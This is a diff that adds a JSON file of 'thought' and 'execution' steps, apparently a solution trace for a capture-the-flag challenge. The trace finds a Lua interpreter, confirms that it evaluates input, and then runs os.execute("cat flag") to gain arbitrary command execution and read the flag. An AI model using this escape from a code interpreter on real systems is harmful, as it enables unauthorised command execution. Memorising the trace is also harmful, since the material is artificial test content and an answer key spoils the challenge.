@@ -1,0 +1,26 @@
+[
+    {
+        "type": "thought",
+        "content": "If we invoke the help command, we can notice that the interpreter is lua:"
+    },
+    {
+        "type": "execution",
+        "content": "help"
+    },
+    {
+        "type": "thought",
+        "content": "If the command is evaluated directly, this should work too:"
+    },
+    {
+        "type": "execution",
+        "content": "io.write(\"Hello world, from \",_VERSION,\"!\\n\")"
+    },
+    {
+        "type": "thought",
+        "content": "Now we can execute arbitrary command, we read the challenge code and the flag:"
+    },
+    {
+        "type": "execution",
+        "content": "os.execute(\"cat flag\")\nEM"
+    }
+]
